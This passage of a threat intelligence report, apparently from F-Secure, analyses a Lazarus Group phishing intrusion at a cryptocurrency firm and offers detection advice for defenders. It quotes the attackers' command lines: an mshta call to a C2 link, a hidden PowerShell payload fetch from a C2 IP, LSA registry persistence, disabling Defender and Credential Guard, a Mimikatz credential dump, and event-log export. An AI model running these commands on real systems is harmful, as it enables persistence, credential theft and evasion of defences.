The attack\nwas linked to a wider, ongoing global phishing campaign. The detail in this report provides detection\nopportunities for blue teams seeking to defend their organizations from attacks by the group.\n\nLazarus Group’s interests reportedly align with those of the government of the Democratic People's Republic\nof Korea (DPRK). According to a 2019 UN report[2] Lazarus Group has been targeting organizations in the\ncryptocurrency vertical since at least 2017. Consistent with public reporting on the group’s activities, the main\nobjective of the attack uncovered by F-Secure was financial gain.\n\nF-Secure attributed the attack to the Lazarus Group based on similarities in malware, Tactics, Techniques &\nProcedures (TTPs) observed, and wider intelligence of the group’s operational practices. F-Secure’s analysis of\nthe malware suggested strong similarities to samples leveraged in other Lazarus Group campaigns, detailed in\nresearch previously published by Kaspersky[3] and ESET[4]. Lazarus Group was observed leveraging a combination\nof custom malware and native operating system (OS) utilities to reach its objective.\n\nThrough the investigation it became clear that Lazarus Group invests significant time in operational security to\navoid detection and remove evidence of their activity. Prior to F-Secure's investigation, Lazarus Group\nattempted to remove evidence of its presence on the target through the secure deletion of tooling and log\ndata. However, some samples were retrievable, as well as some auto-captured by the target’s Endpoint\nDetection & Response (EDR) solution.\n\nF-Secure assess the attack on the target to be advanced in nature and was able to link this activity with a global\nphishing campaign running since at least January 2018. The attack was linked to this wider set of activity\nthrough several common indicators found in samples from the investigation, open source repositories, and\nproprietary intelligence sources. Where possible, evidence has been included in the body and appendices of\nthis report to allow the security industry to leverage these details across their apertures, and draw their own\nconclusions. F-Secure believes this information will help targeted organizations protect their networks\n**from future attacks and raise the cost of operation for the group.**\n\n1 [https://attack.mitre.org/groups/G0032/](https://attack.mitre.org/groups/G0032/)\n\n2 [https://asia.nikkei.com/Spotlight/N-Korea-at-crossroads/North-Korea-stole-cryptocurrency-via-hacking-UN-panel](https://asia.nikkei.com/Spotlight/N-Korea-at-crossroads/North-Korea-stole-cryptocurrency-via-hacking-UN-panel)\n\n3 [https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)\n\n4 [https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/](https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/)\n\n\n-----\n\n## INITIAL ACCESS\n\nF-Secure’s investigation revealed that a system administrator from the target organization received a phishing\ndocument via their personal LinkedIn account. The document masqueraded as a legitimate job advert for a\nrole in a blockchain technology company that matched the employee’s skills.\n\nThough the document on the target’s host had been altered to remove malicious content after execution,\nF-Secure assessed that the original document was the same, or similar to, a sample publicly available on\nVirusTotal[5] (see image below). This was based on metadata analysis and execution evidence noted in the\nSystem Resource Usage Monitor (SRUM) database.\n\n**_Figure 1: Malicious document listed by VirusTotal_**\n\nMetadata analysis showed the document and VirusTotal sample shared identical values for the document\nname, author, last saved by, and word count properties. The creation time and character count were not\nidentical, but similar enough to suggest a relationship between the two documents.\n\n5 [https://www.virustotal.com/gui/file/7446efa798cfa7908e78e7fb2bf3ac57486be4d2edea8a798683c949d504dee6/details](https://www.virustotal.com/gui/file/7446efa798cfa7908e78e7fb2bf3ac57486be4d2edea8a798683c949d504dee6/details)\n\n\n-----\n\n**_Figure 2: Target’s malicious document metadata_**\n\nHowever, the document’s file sizes were different—181,248 bytes vs 289,280 bytes. The Master File Table (MFT) entry for this document suggests that it\ncould have been modified roughly thirty minutes after it was created.\n\n**Figure 3: Target’s malicious document MFT entries**\n\n\n-----\n\nWhen reviewing the LNK (link) file on the target host relating to the document, the original file size can be\nseen in the “target file size” field. This file size is identical to the malicious VirusTotal sample, providing another\nstrong link between the two documents.\n\n**Figure 4: Target’s malicious document LNK metadata**\n\nAs can be seen in the below image, the malicious version of the document claimed to be protected by General\nData Protection Regulation (GDPR) and that content needed to be enabled in Word to access the document.\nThe enablement of content would then result in the malicious embedded macro code to execute.\n\n**_Figure 5: Malicious document GDPR content_**\n\nThe malicious execution chain was then the same as noted in the JPCERT report[6], where the macro in the\ndocument creates an LNK file that resulted in the execution of mshta.exe to call out to a “bit.ly” link created in\nearly May 2019.\n\n6 [https://blogs.jpcert.or.jp/en/2019/07/spear-phishing-against-cryptocurrency-businesses.html](https://blogs.jpcert.or.jp/en/2019/07/spear-phishing-against-cryptocurrency-businesses.html)\n\n\n-----\n\n```\nmshta.exe https://bit[.]ly/2vwLE0m\n\n```\n\nThe link was accessed 73 times from several countries, as noted in Figure 6 below. Some of these were likely\nresearchers, however, the spike in May, and the countries with high counts, led F-Secure to assess that this was\na relatively widely-targeted lure document.\n\n**_Figure 6: “bit.ly” link access statistics_**\n\nThe “bit.ly” link redirected to a domain from which a VBScript was executed to perform checks on the host and\ncollect further information to send to a second Command and Control (C2) domain. This script and execution\nchain are covered in more detail in the Weibu Intelligence Bureau report[7] .\n\nIn the F-Secure investigation, this eventually led to the download and execution of a PowerShell script that\nretrieved a further payload from a third C2 domain. Shortly after this payload was retrieved, the main implants\nused by Lazarus Group appeared on the target host.\n```\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w Hidden -ep Bypass \n-file C:Users\\<USER>\\AppData\\Local\\Temp\\usoclient.ps1 66.181.166[.]15:8080/uc\n188652471\n\n```\nOnce the initial chain of infection had executed, the main implant leveraged against the target was\ndownloaded and loaded in to the lsass.exe process. Evidence of this execution was captured within the SRUM\ndatabase as well as the data transferred to and from the target host (see screenshot below). Note, the entry\n\n7 [https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2371](https://x.threatbook.cn/nodev4/vb4/article?threatInfoID=2371)\n\n\n-----\n\ntime is not accurate and reflects the time written to the database rather than the time of execution, which\nusually accounts for activity across the previous hour.\n\n**Figure 7: System Resource Usage Monitor (SRUM) database entries**\n\nThis infection chain appeared to be highly conditional based on information retrieved from the target, and\nnotably differs across other public reporting of the campaign. The different possible execution chains\nobserved by F-Secure are detailed in the diagram below.\n\n\n-----\n\n**_Figure 8: Infection chain_**\n\nF-Secure leveraged additional available data to pivot from this observed activity to further phishing artefacts,\nassessed to be part of a wider campaign running since at least January 2018. Artifacts identified were linked to\nfourteen countries, suggesting this was a wide-ranging global campaign. Those countries were: US, CN, UK,\nCA, DE, RU, KR, AR, SG, HK, NL, EE, JP & PH. The Indicators of Compromise (IOCs) relating to these artefacts\nare included in the appendices below.\n\n\n-----\n\n## NETWORK BACKDOOR IMPLANTS\n\nLazarus Group leveraged two separate network backdoor implants that appeared similar to the “Passive\nBackdoor” first reported[8] by Kaspersky as being used by the group in 2016. The samples F-Secure analysed\nwere packed using Themida and despite being x64 variants, analysis showed significant code similarities with\nthe x86 variants used in 2016.\n\n**Sample Name(s)** **SHA256** **Compile Time**\n\nmcc.exe a2f0a1d469d73a11c69afc9eb12000fa7f7652305d936a10d12dabce693f878b 2017-08-18\n\n00:02:50\n\nmmc.exe/mss.exe f8915227c25c5ac552d66f3708f615cd517363953829d3715f38666d7dfa9770 2017-11-15\n\n12:10:00\n\nThe backdoor requires a port to be entered as an argument on the command line when executed and uses the\nwindows netsh utility to open that port in the Windows Firewall. The implant was observed operating on TCP\nports 443, 3388, 3399, 5500 and 5555; example execution recorded on the target network is shown below.\n```\nC:\\ProgramData\\mcc.exe 3388\nnetsh firewall add portopening TCP 3388 Assistance\n\n```\nDespite the difference in instruction set it is possible to see the same operation was used to hide the console\nwindow and the same amount of time is defined to both wait for the operation to be completed and to sleep\nbefore continuing. These similarities can be seen in the screenshot below.\n\n8 [https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf)\n\n|Sample Name(s)|SHA256|Compile Time|\n|---|---|---|\n|mcc.exe|a2f0a1d469d73a11c69afc9eb12000fa7f7652305d936a10d12dabce693f878b|2017-08-18 00:02:50|\n|mmc.exe/mss.exe|f8915227c25c5ac552d66f3708f615cd517363953829d3715f38666d7dfa9770|2017-11-15 12:10:00|\n\n\n-----\n\n**Figure 9: Network backdoor code similarities**\n\nThe samples analysed by F-Secure also shared similarities with a “TCP Backdoor” reportedly used by Lazarus Group in a 2018 ESET report[9] in attacks against\ncasinos. When unpacked the “mmc.exe” (f8915227c25c5ac552d66f3708f615cd517363953829d3715f38666d7dfa9770) sample is identical to the\nunpacked version of one of the VMProtect samples in the ESET report (8b6887c5ec6fadaefee78f089e9a347a539bcedf52f5827f866a49a1839f8c4b).\nFigure 10 shows the same strings across the unpacked samples from the three different intrusions.\n\n9 [https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/](https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/)\n\n\n-----\n\n**Figure 10: Netsh string commonalities**\n\nAs the ESET report details, the backdoor can execute a number of commands it receives via the listening port,\nand also stores logging and configuration information in files such as “perflog.dat” and “perflog.evt” in the\n_“%WINDIR%\\Temp\\” directory._\n\n\n-----\n\n## CUSTOM PE LOADER\n\nF-Secure’s investigation uncovered “LSSC.dll”\n(72e0965385eae2d3a2f20feb361ce542235fe44c08991644a0a231f595039e68), a custom PE loader. The\nfile was loaded into the lsass.exe process by masquerading as a “Security Package”[10] via the\n“HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages” registry key.\n\nF-Secure observed that Lazarus Group would modify this key locally using the reg windows utility and check\nthis was successful via the same utility. Once this was confirmed as successful the system would be restarted in\norder for DLL to be loaded. Examples of these executions can be seen below.\n```\nreg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v Security\nPackages\nreg add HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v Security\nPackages /t REG_MULTI_SZ /d lssc /f\nreg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa /v Security\nPackages \nshutdown /t 0 /r /f\n\n```\nLater in the intrusion Lazarus Group was observed modifying this registry key remotely using the schtasks\nwindows utility, as can be seen in the below snippet.\n```\ncmd.exe /c \"schtasks /Create /S <IP ADDRESS> /P <PASSWORD>! /U \"<DOMAIN>\\<USER> \" /TN\n\"MSC\" /TR \"reg add /\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa/\" /v\n/\"Security Packages/\" /t REG_MULTI_SZ /d /\"ldap/\" /f\" /SC ONSTART /RU SYSTEM /F\n>C:\\Windows\\TEMP\\TMPD2E6.tmp 2>&1\"\n\n```\nThe sample analysed was compiled just prior to the observed use and the internal name of the file was\n“xml.dll”. The file was dropped in the System32 directory, and once executed it is hardcoded to attempt to use\ncustom PE loading code for the file “LDAP.dat”. F-Secure was unable to retrieve a copy of “LDAP.dat”, but it is\nbelieved to contain a final payload that provides Lazarus Group with the ability to execute additional\ncommands.\n\n10 [https://docs.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls](https://docs.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)\n\n\n-----\n\n## MAIN IMPLANTS\n\nThe main implants both contain the capability to download additional files, decompress data in memory,\ninitiate C2 communication, execute arbitrary commands, and steal credentials from a number of sources. The\nimplants were also observed being used to connect to the network backdoor implants on other target hosts.\n\n**Sample Name(s)** **SHA256** **Compile Time**\n\nlssvc.dll 519f100ddc98cfb9aca3e13c0095bddeadf11c50397096953171d042ca376fbd 2019-03-21\n\n04:16:06\n\nntuser.cat 831ba6efa4a49eb1c7ff749fe442b393c5a614f383bf1efb52512a183b4362fc 2019-03-21\n\n04:16:07\n\n“LSSVC.dll” (519f100ddc98cfb9aca3e13c0095bddeadf11c50397096953171d042ca376fbd) was dropped\ninto the System32 directory and loaded in to the lsass.exe process. Analysis indicates that this file has the\ncapability to be loaded in multiple ways. The implant is a x64 DLL and contains the Zlib 1.2.7 and Libcurl 7.47.1\nsoftware libraries, suggesting it is capable of downloading and decompressing additional data.\n\nOnce loaded, it will read and decrypt configuration information from a 6,816 byte “.sdb” file stored in\n_“%WINDIR%\\AppPatch\\”. The samples F-Secure analysed were specifically looking for configuration files with_\nthe name “mscmain.sdb” or “msomain.sdb”, and were decrypted using the RC4 key “F9 5E 06 0B E3 1B 18 03\n_24 3F 00 CC DE AB F6 93 1B 2A CB 5B 6A C3 67 36 62 60 EC 82 46 37 D2 4A”. The implant also has the ability_\nto encrypt and write this data to disk, allowing Lazarus Group to update this information when required.\n\nThe “.sdb” file contained C2 information as well as a hardcoded target specific directory\n(“C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\CLR\\”) referencing additional malicious files. Though\nthe “LSSVC.dll” variant of this implant does not appear to have the capability to interact further with these files.\n\n“NTUSER.cat” (831ba6efa4a49eb1c7ff749fe442b393c5a614f383bf1efb52512a183b4362fc) is another x64\nDLL similar to “LSSVC.dll”. However, this variant was dropped in the “C:\\Users\\” directory and is not designed\nto be loaded into the lsass.exe process.\n\n“NTUSER.cat” uses the same software libraries as “LSSVC.dll” and also reads configuration information from the\nsame “.sdb” files; however, this implant has the additional capability to load the referenced files from disk and\ninject them into another process. The files were loaded using the following steps:\n\n - Read the file into a memory buffer\n\n - The first 0x80 bytes are read, but only the first 0x60 bytes are interpreted as the RC4 key to decrypt the\n\nremainder of the file\n\n - Decrypt the data using this key and the RC4 algorithm\n\n - If the resulting data is a PE file, it is injected and loaded in to the “explorer.exe” process.\n\nThe copies of these additional files retrieved by F-Secure had been overwritten with random data in order to\nprevent further analysis.\n\n|Sample Name(s)|SHA256|Compile Time|\n|---|---|---|\n|lssvc.dll|519f100ddc98cfb9aca3e13c0095bddeadf11c50397096953171d042ca376fbd|2019-03-21 04:16:06|\n|ntuser.cat|831ba6efa4a49eb1c7ff749fe442b393c5a614f383bf1efb52512a183b4362fc|2019-03-21 04:16:07|\n\n\n-----\n\n## OTHER TACTICS, TECHNIQUES AND PROCEDURES (TTPS)\n\nF-Secure identified several other TTPs of interest leveraged by Lazarus Group during the attack. To avoid\ndetection, Lazarus Group disabled Windows Defender monitoring as one of their first actions on each host\nthey accessed. This was done through the execution of the below PowerShell commands.\n```\ncmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference\n-DisableBehaviorMonitoring $false 2>&1\ncmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SetMpPreference -DisableRealtimeMonitoring $true 2>&1\n\n```\nAs reported by ESET, Lazarus Group was observed using a custom version of Mimikatz to capture credentials;\nhowever, as can be seen below they have not obfuscated the commonly used functions.\n\n```\n cmd.exe c:\\users\\public\\pmp.dat privilege::debug sekurlsa::logonPasswords\n\n```\n\nTo enable this Lazarus Group was observed disabling Credential Guard and enabling the storage of credentials\nin memory via the below registry key modifications.\n```\ncmd.exe /c reg add HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Lsa /v LsaCfgFlags /t\nREG_DWORD /d 0 /f 2>&1\ncmd.exe /c reg add\nHKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest /v\nUseLogonCredential /t REG_DWORD /d 1 /f 2>&1\n\n```\nThroughout F-Secure's investigation it became evident that Lazarus Group was conscious to avoid detection\nand would remove evidence of their presence, as can be seen in the below snippet.\n```\ncmd.exe /c \"wevtutil epl security \"/q:*[System[(EventID=4778 or EventID=4624)]]\"\nc:\\users\\public\\evt2.dat >C:\\Windows\\TEMP\\TMP1AC9.tmp 2>&1\"\n\n```\nOn all but a single host, which was powered off halfway through the intrusion and therefore unreachable,\nLazarus Group was able to securely delete traces of any of the malware they employed as well as significant\nquantities of forensic evidence. The presence of a third-party EDR agent with auto-capture features for certain\nfile types proved a valuable source of evidence preserved from this deletion. In addition, the live EDR data\nrecorded valuable details of actions performed by the group.\n\n\n-----\n\n## DETECTION\n\nThe execution of these commands provide significant opportunities for detection for any organisation with\nEDR telemetry. Whilst the goal of some of the commands are to ultimately avoid detection and remain\nstealthy, these actions are “noisy” in themselves and provide detection opportunities. The above provided\nexamples of the disabling of windows security controls should be anomalous in any network, and can be used\nto engineer high fidelity detection use cases.\n\nLazarus Group was observed executing a large number of commands through cmd.exe and other native OS\nutilities throughout their time on the target network. Despite attempts to avoid detection and blend in with\nstandard activity on the network, elements of the commands used will often be anomalous and use specific\nesoteric strings that offer blue teams detection opportunities. One distinctive trait common across the\nmajority of the commands executed by Lazarus Group was the appending of the string “2>&1” to commands;\nwhich whilst used by some tooling should be anomalous when filtered by parent child process relationship,\nand provide good detection opportunities.\n\nF-Secure advises organisations with Lazarus Group in their threat profile to develop good coverage of these\nnative OS techniques to maximise detection opportunities. These commands can blend in with standard\nactivity, so it may not be possible to build high fidelity detection for all the techniques used. In this situation\nthe use of lower fidelity detections that are then aggregated on a host basis in order to correlate activity and\nbuild intelligent thresholding in to alerting systems can help to detect malicious activity without generating\ntoo many false positives.\n\nThe custom PE loader and one variant of the main implant were both loaded in to the lsass.exe process as\nunsigned DLLs, which is a high-fidelity indicator for anyone monitoring these module load events. The\naddition of the registry key to load these files is also a high-fidelity indicator that could be detected through\nthe command line execution or registry scanning for the creation of keys in this path.\n\nThere were a number of files created on disk by Lazarus Group, with notably “perflog.dat” and “perflog.evt”\nhaving been created in the “%WINDIR%\\Temp\\” directory and observed across previous campaigns. In\naddition, analysis of the main implants indicates they create the file “mscmain.sdb” or “msomain.sdb” in the\n“%WINDIR%\\AppPatch\\” directory. In both cases the files appear to be uniquely used by this group; therefore,\nprovide a high fidelity indicator that can be used for detection and potential attribution.\n\nBeyond host level detection there are also significant opportunities to detect the network layer activity of the\nvarious implants, which were using anomalous ports to communicate between workstations and servers that\nwould stand out from standard traffic. The target organisation had an artificial intelligence based network\ndetection security tool installed, unfortunately this did not raise any alerts generated during this time period.\nThe tool was a useful source for evidence during the investigation and the telemetry collected did contain\nactionable detection data that blue teams could leverage for proactive means.\n\n\n-----\n\n## CONCLUSION\n\nLazarus Group has demonstrated sophistication and operational security awareness in executing a prolonged\nand ostensibly successful cybercrime campaign. The success of this campaign is evidenced in a recent\nannouncement by the US Treasury[11] relating to money laundering of the profits of Lazarus Group. The findings\nof F-Secure’s investigation are consistent with the strategic intelligence picture, but provide more detail on\nthe group’s current tactics, techniques and procedures.\n\nLazarus Group’s activities are a continued threat: the phishing campaign associated with this attack has been\nobserved continuing into 2020, raising the need for awareness and ongoing vigilance amongst organisations\noperating in the targeted verticals. It is F-Secure’s assessment that the group will continue to target\norganisations within the cryptocurrency vertical while it remains such a profitable pursuit, but may also expand\nto target supply chain elements of the vertical to increase returns and longevity of the campaign. In addition,\nsome of the newer C2 infrastructure suggests the group may be looking to target organisations in the financial\ninvestment vertical.\n\nIt is also F-Secure’s assessment that organisations in other verticals likely to be targeted by elements of DPRK\ncyber operations should take note of the details contained within this report. There is evidence in recent\nreporting[12] of Lazarus Group leveraging similar techniques to those observed in this campaign, such as the\npreference of LinkedIn as a delivery medium, to compromise organisations in other verticals. This is also\nsupported by the evidence that Lazarus Group has re-used tooling across multiple campaigns, as noted\npreviously in this report.\n\nLazarus Group has continued to use some of the same family of tooling observed in 2016, though analysis of\nseveral samples suggest this is being updated over time. It is F-Secure’s assessment that the investment in\nboth malware anti-analysis techniques and operational security to remove evidence of their presence has\npreserved the operationally effectiveness of this tooling for Lazarus Group. It is also possible that the group\nlack the capability to easily retool and therefore are reliant on maximising the utility of the existing tooling at\ntheir disposal. However, other tooling has been publicly attributed to the group which suggests further\ncapability can be leveraged if required due to target controls.\n\nF-Secure found that the activities performed by Lazarus Group, whilst effective, offered significant\nopportunities for detection. Organisations targeted by Lazarus Group should review their detection capability,\nwith regards to both technology and people, against the techniques noted in this report and those in the\nMITRE ATT&CK framework[13] attributed to the Lazarus Group.\n\nThe target in this investigation had a leading EDR and network security tool installed that captured telemetry\nof Lazarus Groups actions, but this did not result in a positive detection that was actioned. It is F-Secure’s view\nthat people play an important role in building effective detection capability, and this incident serves as an\nexample of the need to invest in people as well as technology.\n\n11 [https://home.treasury.gov/news/press-releases/sm924](https://home.treasury.gov/news/press-releases/sm924)\n\n[12
